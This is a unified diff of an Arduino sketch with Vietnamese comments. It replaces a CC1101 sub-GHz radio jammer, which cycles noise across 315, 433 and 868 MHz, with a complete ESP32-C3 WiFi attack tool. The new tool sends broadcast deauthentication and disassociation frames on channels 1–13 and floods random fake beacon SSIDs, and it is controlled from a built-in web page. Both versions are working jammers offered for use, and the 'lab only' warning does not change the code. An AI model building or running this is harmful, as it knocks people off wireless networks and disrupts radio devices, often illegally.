@@ -1,239 +1,313 @@
-#include <Arduino.h>
-#include <ELECHOUSE_CC1101_SRC_DRV.h>
+/*
+ * ESP32-C3 WiFi Jammer via Web Server
+ * - AP "C3-Jammer" / pass 12345678
+ * - Web UI: DEAUTH / BEACON SPAM / JAM ALL
+ * - Burst 3s jam / 2s nhường AP
+ *
+ * Board: ESP32-C3 Dev Module
+ * Core:  esp32 by Espressif 2.0.14 hoặc 3.x — build được cả hai
+ * Libraries: built-in only
+ *
+ * ⚠️ CHỈ DÙNG TRONG LAB CÁCH LY — GÂY NHIỄU WIFI VI PHẠM PHÁP LUẬT
+ */
 
+#include <WiFi.h>
+#include <WebServer.h>
+#include <esp_wifi.h>
+#include <esp_netif.h>
+#include <esp_event.h>
 
-#define CC1101_GDO0 10
-#define CC1101_CS   5
-#define CC1101_SCK  4
-#define CC1101_MOSI 7
-#define CC1101_MISO 6
-#define LED_PIN     8   // Den onboard ESP32-C3 super mini
+// ============================================================
+// KHÔNG định nghĩa ieee80211_raw_frame_sanity_check
+// (đã có sẵn trong libnet80211.a → trùng symbol khi link)
+// ============================================================
 
-// Thoi gian chay moi che do truoc khi chuyen (ms) - giong chu ky Bruce
-#define MODE_TIME_MS   6000
-// Thoi gian mot phase trong che do FULL (Bruce dung 100ms)
-#define PHASE_TIME_MS  100
+extern "C" {
+  esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
+  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
+}
 
-enum JamMode { JAM_FULL, JAM_ITMT, JAM_NOISE, JAM_SWEEP, JAM_MODE_COUNT };
-const char* MODE_NAMES[] = {"FULL POWER", "INTERMITTENT", "NOISE STORM", "FREQ SWEEP"};
+// ============================================================
+// CẤU HÌNH
+// ============================================================
+const char* AP_SSID = "C3-Jammer";
+const char* AP_PASS = "12345678";
 
+WebServer server(80);
 
-const float jam_frequency_list[] = {
-  
-  315.000f, 330.000f, 345.000f, 350.000f,
+volatile bool     flagDeauth    = false;
+volatile bool     flagBeacon    = false;
+volatile bool     flagJamAll    = false;
+volatile uint32_t pktCount      = 0;
+volatile uint32_t beaconCount   = 0;
 
-
-  433.050f, 433.150f, 433.250f, 433.350f, 433.450f, 433.550f, 433.650f,
-  433.750f, 433.850f, 433.920f, 434.000f, 434.100f, 434.190f, 434.300f,
-  434.390f, 434.420f, 434.500f, 434.600f, 434.700f, 434.790f,
-
-  
-  868.000f, 868.300f, 868.400f, 868.800f, 868.950f
+// ============================================================
+// FRAME TEMPLATES
+// ============================================================
+static const uint8_t deauth_tmpl[] = {
+  0xC0, 0x00, 0x00, 0x00,
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+  0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,0x00,0x00,0x00,0x00,
+  0x00,0x00,
+  0x07,0x00
 };
-const int jam_frequency_count = sizeof(jam_frequency_list) / sizeof(jam_frequency_list[0]);
 
-int freqIdx = 0;
-JamMode jamMode = JAM_FULL;
-unsigned long modeTimer = 0;
-unsigned long ledTimer = 0;
-bool ledState = false;
+uint8_t beacon_packet[109] = {
+  0x80,0x00,0x00,0x00,
+  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
+  0x01,0x02,0x03,0x04,0x05,0x06,
+  0x01,0x02,0x03,0x04,0x05,0x06,
+  0x00,0x00,
+  0x83,0x51,0xf7,0x8f,0x0f,0x00,0x00,0x00,
+  0xe8,0x03,
+  0x31,0x00,
+  0x00,0x20,
+  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
+  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
+  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
+  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
+  0x01,0x08,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c,
+  0x03,0x01,0x01,
+  0x30,0x18,0x01,0x00,0x00,0x0f,0xac,0x02,
+  0x02,0x00,0x00,0x0f,0xac,0x04,0x00,0x0f,0xac,0x04,
+  0x01,0x00,0x00,0x0f,0xac,0x02,0x00,0x00
+};
 
+// ============================================================
+// GỬI FRAME
+// ============================================================
+static inline void sendDeauth(uint8_t chan,
+                              const uint8_t* rcv,
+                              const uint8_t* src,
+                              const uint8_t* bssid,
+                              uint8_t type = 0xC0) {
+  esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
 
-void cc1101BaseInit(float freq) {
-  ELECHOUSE_cc1101.setMHZ(freq);
-  ELECHOUSE_cc1101.setDeviation(47.6);   
-  ELECHOUSE_cc1101.setRxBW(812);        
-  ELECHOUSE_cc1101.setPA(12);           
+  uint8_t f[sizeof(deauth_tmpl)];
+  memcpy(f, deauth_tmpl, sizeof(deauth_tmpl));
+  f[0] = type;
+  memcpy(f + 4,  rcv,   6);
+  memcpy(f + 10, src,   6);
+  memcpy(f + 16, bssid, 6);
+
+  uint16_t seq = (uint16_t)(random(0, 4096) << 4);
+  f[22] = seq & 0xFF;
+  f[23] = (seq >> 8) & 0xFF;
+
+  esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false);
+  pktCount++;
 }
 
-void cc1101AsyncMode() {                 
-  ELECHOUSE_cc1101.setSidle();
-  ELECHOUSE_cc1101.setPktFormat(3);
-  ELECHOUSE_cc1101.setDRate(800);
-  ELECHOUSE_cc1101.setModulation(2);      
-  ELECHOUSE_cc1101.SetTx();
+static inline void sendBeacon(uint8_t chan, const char* ssid) {
+  uint8_t mac[6];
+  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(256);
+
+  uint8_t pkt[109];
+  memcpy(pkt, beacon_packet, 109);
+  memcpy(&pkt[10], mac, 6);
+  memcpy(&pkt[16], mac, 6);
+  memset(&pkt[38], ' ', 32);
+
+  size_t len = strlen(ssid);
+  if (len > 32) len = 32;
+  memcpy(&pkt[38], ssid, len);
+  pkt[82] = chan;
+
+  esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
+  beaconCount++;
 }
 
+// ============================================================
+// TASK JAMMER
+// ============================================================
+void jammerTask(void* pv) {
+  const uint8_t channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
+  const int nCh = 13;
+  char ssidBuf[33];
 
-void runFullPower() {
-  cc1101AsyncMode();
-  unsigned long startPhase = millis();
-  uint8_t phase = 0;
+  for (;;) {
+    if (!flagDeauth && !flagBeacon && !flagJamAll) {
+      vTaskDelay(pdMS_TO_TICKS(200));
+      continue;
+    }
 
-  while (millis() - modeTimer < MODE_TIME_MS) {
-    unsigned long elapsed = millis() - modeTimer;
-    phase = (elapsed / PHASE_TIME_MS) % 3;
+    unsigned long t0 = millis();
+    uint8_t chIdx = 0;
 
-    switch (phase) {
-      case 0:
+    while (millis() - t0 < 3000) {
+      if (!flagDeauth && !flagBeacon && !flagJamAll) break;
 
-        for (int i = 0; i < 100; i++) {
-          digitalWrite(CC1101_GDO0, HIGH);
-          delayMicroseconds(3);
-          digitalWrite(CC1101_GDO0, LOW);
-          delayMicroseconds(1);
+      if (flagDeauth || flagJamAll) {
+        static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+        for (uint8_t c = 1; c <= 13; c++) {
+          sendDeauth(c, bcast, bcast, bcast, 0xC0);
+          sendDeauth(c, bcast, bcast, bcast, 0xA0);
         }
-        break;
-      case 1:
+      }
 
-        for (int i = 0; i < 50; i++) {
-          uint32_t w = 2 + (micros() % 18);
-          digitalWrite(CC1101_GDO0, HIGH);
-          delayMicroseconds(w);
-          digitalWrite(CC1101_GDO0, LOW);
-          delayMicroseconds(1);
+      if (flagBeacon || flagJamAll) {
+        for (int i = 0; i < 4; i++) {
+          uint8_t len = random(6, 16);
+          for (uint8_t j = 0; j < len; j++) ssidBuf[j] = (char)random(32, 127);
+          ssidBuf[len] = 0;
+          sendBeacon(channels[chIdx], ssidBuf);
         }
-        break;
-      case 2:
+      }
 
-        digitalWrite(CC1101_GDO0, HIGH);
-        delayMicroseconds(80);
-        digitalWrite(CC1101_GDO0, LOW);
-        delayMicroseconds(2);
-        digitalWrite(CC1101_GDO0, HIGH);
-        delayMicroseconds(80);
-        break;
+      chIdx = (chIdx + 1) % nCh;
+      vTaskDelay(pdMS_TO_TICKS(2));
     }
-    yield();   
-    (void)startPhase;
+
+    vTaskDelay(pdMS_TO_TICKS(2000));
   }
-  digitalWrite(CC1101_GDO0, LOW);
 }
 
-// 
-void runIntermittent() {
-  cc1101AsyncMode();
-  while (millis() - modeTimer < MODE_TIME_MS) {
-    
-    unsigned long burstStart = millis();
-    for (int i = 0; i < 500; i++) {
-      uint32_t pulseWidth = 1 + (micros() % 60);
-      digitalWrite(CC1101_GDO0, HIGH);
-      delayMicroseconds(pulseWidth);
-      digitalWrite(CC1101_GDO0, LOW);
-      uint32_t spaceWidth = 1 + (micros() % 8);
-      delayMicroseconds(spaceWidth);
-      if (millis() - burstStart > 250) break;
-    }
-    yield();
-  }
-  digitalWrite(CC1101_GDO0, LOW);
+// ============================================================
+// WEB UI
+// ============================================================
+const char PAGE_HTML[] PROGMEM = R"HTML(
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>C3 Jammer</title>
+<style>
+  body{font-family:Arial;background:#111;color:#eee;margin:0;padding:20px}
+  h1{text-align:center;color:#f44}
+  .card{background:#222;border-radius:10px;padding:16px;margin:12px 0}
+  .row{display:flex;justify-content:space-between;align-items:center;margin:10px 0}
+  .switch{position:relative;display:inline-block;width:60px;height:34px}
+  .switch input{opacity:0;width:0;height:0}
+  .slider{position:absolute;cursor:pointer;inset:0;background:#555;border-radius:34px;transition:.3s}
+  .slider:before{position:absolute;content:"";height:26px;width:26px;left:4px;bottom:4px;background:#fff;border-radius:50%;transition:.3s}
+  input:checked + .slider{background:#f44}
+  input:checked + .slider:before{transform:translateX(26px)}
+  .stat{font-size:14px;color:#8f8}
+  button{background:#444;color:#fff;border:0;padding:10px 16px;border-radius:6px;font-size:16px}
+  button:active{background:#f44}
+</style></head><body>
+<h1>⚡ C3 JAMMER ⚡</h1>
+
+<div class="card">
+  <div class="row"><b>DEAUTH (ngat ket noi)</b>
+    <label class="switch"><input type="checkbox" id="deauth"><span class="slider"></span></label>
+  </div>
+  <div class="row"><b>BEACON SPAM (SSID gia)</b>
+    <label class="switch"><input type="checkbox" id="beacon"><span class="slider"></span></label>
+  </div>
+  <div class="row"><b>JAM ALL (ca 2)</b>
+    <label class="switch"><input type="checkbox" id="jamall"><span class="slider"></span></label>
+  </div>
+</div>
+
+<div class="card">
+  <div class="row"><span>Packets:</span><span class="stat" id="pkts">0</span></div>
+  <div class="row"><span>Beacons:</span><span class="stat" id="bcns">0</span></div>
+  <div class="row"><span>Trang thai:</span><span class="stat" id="state">IDLE</span></div>
+</div>
+
+<div class="card" style="text-align:center">
+  <button onclick="stopAll()">STOP ALL</button>
+</div>
+
+<script>
+function send(id,val){
+  fetch('/set?id='+id+'&v='+(val?1:0)).then(r=>r.text()).catch(()=>{});
+}
+document.getElementById('deauth').onchange = e => send('deauth', e.target.checked);
+document.getElementById('beacon').onchange = e => send('beacon', e.target.checked);
+document.getElementById('jamall').onchange = e => send('jamall', e.target.checked);
+
+function stopAll(){
+  ['deauth','beacon','jamall'].forEach(id=>{
+    document.getElementById(id).checked = false;
+    send(id, 0);
+  });
 }
 
+function refresh(){
+  fetch('/status').then(r=>r.json()).then(j=>{
+    document.getElementById('pkts').innerText = j.pkts;
+    document.getElementById('bcns').innerText = j.bcns;
+    document.getElementById('state').innerText = j.state;
+    document.getElementById('deauth').checked = j.deauth;
+    document.getElementById('beacon').checked = j.beacon;
+    document.getElementById('jamall').checked = j.jamall;
+  }).catch(()=>{});
+}
+setInterval(refresh, 1500);
+refresh();
+</script></body></html>
+)HTML";
 
-void runNoiseStorm() {
-  ELECHOUSE_cc1101.setSidle();
-  ELECHOUSE_cc1101.setPktFormat(2);      // PN9 random TX mode
-  ELECHOUSE_cc1101.setDRate(800);
-  ELECHOUSE_cc1101.setModulation(2);     // ASK/OOK
-  ELECHOUSE_cc1101.setDeviation(47.6);
-  ELECHOUSE_cc1101.setRxBW(812);
-  ELECHOUSE_cc1101.setPA(12);
-  ELECHOUSE_cc1101.SetTx();
-
-  static const uint8_t modSchemes[] = {2, 0, 1};  // ASK, 2FSK, MSK
-  uint8_t modCycle = 2;
-  unsigned long lastSwitch = 0;
-
-  while (millis() - modeTimer < MODE_TIME_MS) {
-
-    uint8_t newMod = ((millis() - modeTimer) / 3000) % 3;
-    if (modSchemes[newMod] != modCycle) {
-      modCycle = modSchemes[newMod];
-      ELECHOUSE_cc1101.setSidle();
-      ELECHOUSE_cc1101.setModulation(modCycle);
-      ELECHOUSE_cc1101.SetTx();
-    }
-    yield();
-    (void)lastSwitch;
-  }
-  ELECHOUSE_cc1101.setSidle();
+// ============================================================
+// HANDLERS
+// ============================================================
+void handleRoot() {
+  server.send_P(200, "text/html", PAGE_HTML);
 }
 
+void handleSet() {
+  if (server.hasArg("id") && server.hasArg("v")) {
+    String id = server.arg("id");
+    bool v = (server.arg("v") == "1");
 
-void runFreqSweep() {
-  float baseFreq = jam_frequency_list[freqIdx];
-  float sweepMin = baseFreq - 5.0f;
-  float sweepMax = baseFreq + 5.0f;
-  const float sweepStep = 0.05f;
-  float currentFreq = sweepMin;
-  bool forward = true;
-
-  cc1101AsyncMode();
-  digitalWrite(CC1101_GDO0, HIGH);
-
-  while (millis() - modeTimer < MODE_TIME_MS) {
-    ELECHOUSE_cc1101.setMHZ(currentFreq);
-
-    
-    for (int burst = 0; burst < 40; burst++) {
-      digitalWrite(CC1101_GDO0, HIGH);
-      delayMicroseconds(30);
-      digitalWrite(CC1101_GDO0, LOW);
-      delayMicroseconds(5);
+    if (id == "deauth") {
+      flagDeauth = v;
+    } else if (id == "beacon") {
+      flagBeacon = v;
+    } else if (id == "jamall") {
+      flagJamAll = v;
+      if (v) { flagDeauth = true; flagBeacon = true; }
     }
-
-    if (forward) {
-      currentFreq += sweepStep;
-      if (currentFreq > sweepMax) { currentFreq = sweepMax; forward = false; }
-    } else {
-      currentFreq -= sweepStep;
-      if (currentFreq < sweepMin) { currentFreq = sweepMin; forward = true; }
-    }
-    yield();
   }
-  digitalWrite(CC1101_GDO0, LOW);
-  ELECHOUSE_cc1101.setMHZ(baseFreq);
+  server.send(200, "text/plain", "OK");
 }
 
+void handleStatus() {
+  const char* st = (flagJamAll || flagDeauth || flagBeacon) ? "JAMMING" : "IDLE";
 
+  String json = "{";
+  json += "\"pkts\":"   + String((uint32_t)pktCount)    + ",";
+  json += "\"bcns\":"   + String((uint32_t)beaconCount) + ",";
+  json += "\"deauth\":" + String(flagDeauth ? "true" : "false") + ",";
+  json += "\"beacon\":" + String(flagBeacon ? "true" : "false") + ",";
+  json += "\"jamall\":" + String(flagJamAll ? "true" : "false") + ",";
+  json += "\"state\":\"" + String(st) + "\"";
+  json += "}";
+  server.send(200, "application/json", json);
+}
+
+// ============================================================
+// SETUP
+// ============================================================
 void setup() {
   Serial.begin(115200);
-  Serial.println();
-  Serial.println(F("===== ESP-C3 JAMMER - BRUCE STYLE ====="));
-  Serial.println(F("4 che do: FULL/ITMT/NOISE(PN9)/SWEEP"));
+  delay(500);
+  Serial.println("\n[C3-Jammer] Booting...");
 
-  pinMode(LED_PIN, OUTPUT);
-  digitalWrite(LED_PIN, HIGH);
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAP(AP_SSID, AP_PASS);
+  delay(100);
+  Serial.printf("[AP] SSID=%s IP=%s\n",
+                AP_SSID, WiFi.softAPIP().toString().c_str());
 
-  ELECHOUSE_cc1101.setSpiPin(CC1101_SCK, CC1101_MISO, CC1101_MOSI, CC1101_CS);
-  ELECHOUSE_cc1101.setGDO0(CC1101_GDO0);
-  ELECHOUSE_cc1101.Init();
-  pinMode(CC1101_GDO0, OUTPUT);
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_max_tx_power(78);
+  esp_wifi_set_ps(WIFI_PS_NONE);
 
-  cc1101BaseInit(jam_frequency_list[0]);
+  server.on("/",       handleRoot);
+  server.on("/set",    handleSet);
+  server.on("/status", handleStatus);
+  server.begin();
+  Serial.println("[WEB] http://192.168.4.1");
 
-  modeTimer = millis();
-  Serial.print(F("Freq #0: ")); Serial.println(jam_frequency_list[0]);
-  digitalWrite(LED_PIN, LOW);
+  xTaskCreatePinnedToCore(jammerTask, "jammer", 4096, NULL, 1, NULL, 0);
+  randomSeed(esp_random());
+  Serial.println("[OK] Ready.");
 }
 
 void loop() {
-  // Nhay LED nhip tim
-  if (millis() - ledTimer >= 100) {
-    ledTimer = millis();
-    ledState = !ledState;
-    digitalWrite(LED_PIN, ledState ? HIGH : LOW);
-  }
-
-  // Chay che do hien tai
-  Serial.print(F(">>> Mode: ")); Serial.print(MODE_NAMES[jamMode]);
-  Serial.print(F(" @ ")); Serial.println(jam_frequency_list[freqIdx]);
-  modeTimer = millis();
-
-  switch (jamMode) {
-    case JAM_FULL:   runFullPower();   break;
-    case JAM_ITMT:   runIntermittent(); break;
-    case JAM_NOISE:  runNoiseStorm();  break;
-    case JAM_SWEEP:  runFreqSweep();   break;
-    default: break;
-  }
-
- 
-  jamMode = (JamMode)((jamMode + 1) % JAM_MODE_COUNT);
-  if (jamMode == JAM_FULL) {
-    freqIdx = (freqIdx + 1) % jam_frequency_count;
-    cc1101BaseInit(jam_frequency_list[freqIdx]);
-    Serial.print(F("=== Hop sang ")); Serial.print(jam_frequency_list[freqIdx]); Serial.println(F(" MHz ==="));
-  }
+  server.handleClient();
+  delay(2);
 }
